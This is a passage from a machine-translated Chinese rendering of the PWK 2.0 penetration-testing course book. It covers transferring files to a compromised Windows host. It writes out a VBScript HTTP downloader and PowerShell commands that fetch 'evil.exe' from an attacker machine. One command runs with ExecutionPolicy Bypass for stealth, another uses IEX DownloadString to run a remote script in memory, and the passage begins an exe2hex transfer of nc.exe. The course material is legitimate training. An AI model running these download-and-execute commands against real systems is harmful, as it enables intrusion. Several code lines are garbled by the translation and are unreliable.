<div style="position:absolute;top:48527;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这杂草</font></font></nobr></div>
<div style="position:absolute;top:48544;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i 秒    </font></font></nobr></div>
<div style="position:absolute;top:48544;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送线路的延迟间隔，扫描的端口</font></font></nobr></div>
<div style="position:absolute;top:48560;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l    </font></font></nobr></div>
<div style="position:absolute;top:48560;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听模式，用于入站连接</font></font></nobr></div>
<div style="position:absolute;top:48577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:48597;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 476 - 成功传输 nc.exe</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:48628;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:48628;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用脚本语言的 Windows 下载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以利用脚本引擎，例如 VBScript </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">397</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（在 Windows XP、2003 中）和 PowerShell（在</font></font></nobr></div>
<div style="position:absolute;top:48685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 7、2008 及更高版本）将文件下载到我们的受害者机器。</font><font style="vertical-align: inherit;">例如，以下</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:48755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">397 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/VBScript</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:48883;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="42"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 42 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:48916;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:49993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:49993;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:49993;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">483</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一组非交互式</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，当粘贴到远程 shell 时，将写出一个 wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">充当简单 HTTP 下载程序的脚本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo Dim http、varByteArray、strData、strBuffer、lngCounter、fs、ts &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo Err.Clear &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo 设置 http = Nothing &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo 如果 http 是什么，则设置 http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wge</font></font></nobr></div>
<div style="position:absolute;top:49253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">t.vbs</font></font></nobr></div>
<div style="position:absolute;top:49270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo 如果 http 没有，则设置 http = CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget。</font></font></nobr></div>
<div style="position:absolute;top:49287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟机</font></font></nobr></div>
<div style="position:absolute;top:49303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo 如果 http 是什么，则设置 http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo http.Open "GET", strURL, False &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声 http.Send &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo 设置 http = Nothing &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声设置 ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo strData = "" &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo strBuffer = "" &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声对于 lngCounter = 0 到 UBound(varByteArray) &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声下一个 &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声 ts.Close &gt;&gt; wget.vbs</font></font></nobr></div>
<div style="position:absolute;top:49526;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 477 - 创建一个 VBScript HTTP 下载器脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以运行它（使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cscript</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）从我们的 Kali 机器下载文件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cscript wget.vbs http://10.11.0.4/evil.exe evil.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:49610;left:285"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 478 - 执行 VBScript HTTP 下载程序脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于更新版本的 Windows，我们可以使用 PowerShell 作为更简单的下载</font></font></nobr></div>
<div style="position:absolute;top:49659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择。</font><font style="vertical-align: inherit;">下面的示例显示了使用</font></font></nobr></div>
<div style="position:absolute;top:49679;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.Net.WebClient</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> PowerShell 类：</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">398</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:49929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">398 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:49944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">us/dotnet/api/system.net.webclient?redirectedfrom=MSDN&amp;view=netframework-4.8 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:50071;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="43"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 43 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:50104;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:51181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:51181;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:51181;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">484</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:50194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.2.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:50232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $url = "http://10.11.0.4/evil.exe" &gt;&gt;wget.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:50249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $file = "new-exploit.exe" &gt;&gt;wget.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:50266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:50286;left:288"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 479 - 创建一个 PowerShell HTTP 下载器脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们可以使用 PowerShell 运行脚本并下载我们的文件。</font><font style="vertical-align: inherit;">但是，为了确保两者正确</font></font></nobr></div>
<div style="position:absolute;top:50334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和隐秘执行，我们在脚本的执行中指定了一些选项，如图所示</font></font></nobr></div>
<div style="position:absolute;top:50354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下面在清单 480 中。</font></font></nobr></div>
<div style="position:absolute;top:50387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们必须允许使用PowerShell脚本执行（这是默认的限制）的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:50406;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExecutionPolicy</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键字和</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bypass</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值。</font><font style="vertical-align: inherit;">接下来，我们将使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-NoLogo</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-NonInteractive</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别隐藏 PowerShell 徽标横幅和取消交互式 PowerShell 提示。</font></font></nobr></div>
<div style="position:absolute;top:50445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-NoProfile</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键字就可以阻止的PowerShell加载默认的配置文件（这是不</font></font></nobr></div>
<div style="position:absolute;top:50464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要），最后我们用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-File</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定脚本文件</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:50516;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件 - 文件 wget.ps1</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50535;left:278"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 480 - 执行 PowerShell HTTP 下载程序脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们也可以单行执行这个脚本，如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe (New-Object System.Net.WebClient).DownloadFile('http:/</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:50616;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/10.11.0.4/evil.exe', 'new-exploit.exe')</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50636;left:238"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 481 - 以单行方式执行 PowerShell HTTP 下载程序脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们想下载并执行 PowerShell 脚本而不将其保存到磁盘，我们可以再次</font></font></nobr></div>
<div style="position:absolute;top:50685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.Net.Webclient</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类。</font><font style="vertical-align: inherit;">这是通过将</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法与</font></font></nobr></div>
<div style="position:absolute;top:50704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用-表达</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小命令（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IEX</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">399</font></font></font></nobr></div>
<div style="position:absolute;top:50737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了演示这一点，我们将在 Kali 机器上创建一个简单的 PowerShell 脚本（清单 482）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www/html$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">须藤猫 helloworld.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:50789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">写输出“Hello World”</font></font></nobr></div>
<div style="position:absolute;top:50808;left:284"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 482 - 托管在我们的 Web 服务器上的 Hello World 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将在受感染的 Windows 机器上使用以下命令运行脚本</font></font></nobr></div>
<div style="position:absolute;top:50857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（清单 483）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:50909;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.4/helloworld.ps1')</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你好，世界</font></font></nobr></div>
<div style="position:absolute;top:50945;left:251"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 483 - 直接从内存执行远程 PowerShell 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从我们的 Kali 机器上下载了 PowerShell 脚本的内容并成功</font></font></nobr></div>
<div style="position:absolute;top:50994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行而不将其保存到受害硬盘。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:51117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">399 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:51132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表达式？view=powershell-6 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:51259;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="44"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 44 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:51292;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:52369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:52369;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:52369;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">485</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:51388;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.3</font></font></i></nobr></div>
<div style="position:absolute;top:51388;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 exe2hex 和 PowerShell 下载 Windows</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将走一条有点迂回但非常有趣的路线，以便</font></font></nobr></div>
<div style="position:absolute;top:51445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将二进制文件从 Kali 下载到受感染的 Windows 主机。</font><font style="vertical-align: inherit;">从我们的 Kali 机器开始，我们</font></font></nobr></div>
<div style="position:absolute;top:51464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将压缩我们要传输的二进制文件，将其转换为十六进制字符串，并将其嵌入到 Windows</font></font></nobr></div>
<div style="position:absolute;top:51484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本。</font></font></nobr></div>
<div style="position:absolute;top:51517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 机器上，我们将把这个脚本粘贴到我们的 shell 中并运行它。</font><font style="vertical-align: inherit;">它将重定向十六进制</font></font></nobr></div>
<div style="position:absolute;top:51536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，这将把它组装回二进制文件。</font><font style="vertical-align: inherit;">这将通过一个</font></font></nobr></div>
<div style="position:absolute;top:51556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一系列非交互式命令。</font></font></nobr></div>
<div style="position:absolute;top:51588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，让我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将 Netcat 从我们的 Kali Linux 机器传输到我们的</font></font></nobr></div>
<div style="position:absolute;top:51608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程外壳上的 Windows 客户端。</font></font></nobr></div>
<div style="position:absolute;top:51641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将从在 Kali Linux 上定位和检查 nc.exe 文件开始。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:51675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定位nc.exe | </font><font style="vertical-align: inherit;">grep 二进制文件</font></font></font></b></nobr></div>
<div style="position:absolute;top:51692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/windows-resources/binaries/nc.exe</font></font></nobr></div>
<div style="position:absolute;top:51726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cp /usr/share/windows-resources/binaries/nc.exe 。</font></font></font></b></nobr></div>
<div style="position:absolute;top:51760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -lh nc.exe</font></font></font></b></nobr></div>
